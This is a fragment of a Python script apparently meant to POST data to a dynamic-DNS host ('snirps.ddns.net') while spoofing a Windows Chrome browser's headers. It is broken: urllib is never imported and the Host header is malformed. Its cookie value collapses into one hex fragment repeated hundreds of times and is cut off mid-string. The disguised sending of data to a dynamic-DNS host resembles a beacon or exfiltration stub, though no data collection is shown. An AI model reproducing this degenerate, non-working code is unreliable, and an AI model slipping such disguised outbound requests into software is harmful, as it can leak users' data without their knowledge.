#!/usr/bin/python3
url = "http://snirps.ddns.net"
if __name__ == '__main__':
    #A function that adds a http request.
    def httpRequest(url, data):
        try:
            req = urllib.request.Request(url, data=data)
            req.add_header('User-Agent', 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.125 Safari/537.36')
            req.add_header('Accept', 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8')
            req.add_header('Accept-Language', 'en-US,en;q=0.5')
            req.add_header('Accept-Encoding', 'gzip, deflate')
            req.add_header('Connection', 'keep-alive')
            req.add_header('Cache-Control', 'max-age=0')
            req.add_header('Host', url)
            req.add_header('Referer', url)
            req.add_header('Content-Type', 'application/x-www-form-urlencoded')
            req.add_header('Content-Length', '%d' % len(data))
            req.add_header('Cookie', '__cfduid=d14afaa009f25a009f25a009f25a009f25a009f25a009f25a009f25a009f25a009f25a009f25a009f25a009f25a009f25a009f25a009f25a009f25a009f25a009f25a009f25a009f25a009f25a009f25a009f25a009f25a009f25a009f25a009f25a009f25a009f25a009f25a009f25a009f25a009f25a009f25a009f25a009f25a009f25a009f25a009f25a009f25a009f25a009f25a009f25a009f25a009f25a009f25a009f25a009f25a009f25a009f25a009f25a009f25a009f25a009f25a009f25a009f25a009f25a009f25a009f25a009f25a009f25a009f25a009f25a009f25a009f25a009f25a009f25a009f25a009f25a009f25a009f25a009f25a009f25a009f25a009f25a009f25a009f25a009f25a009f25a009f25a009f25a009f25a009f25a009f25a009f25a009f25a009f25a009f25a009f25a009f25a009f25a009f25a009f25a009f25a009f25a009f25a009f25a009f25a009f25a009f25a009f25a009f25a009f25a009f25a009f25a009f25a009f25a009f25a009f25a009f25a009f25a009f25a009f25a009f25a009f25a009f25a009f25a009f25a009f25a009f25a009f25a009f25a009f25a009f25a009f25a009f25a009f25a009f25a009f25a009f25a009f25a009f25a009f25a009f25a009f25a009f25a009f25a009f25a009f25a009f25a009f25a009f25a009f25a009f25a009f25a009f25a009f25a009f25a009f25a009f25a009f25a009f25a009f25a009f25a009f25a009f25a009f25a009f25a009f25a009f25a009f25a009f25a009f25a009f25a009f25a009f25a009f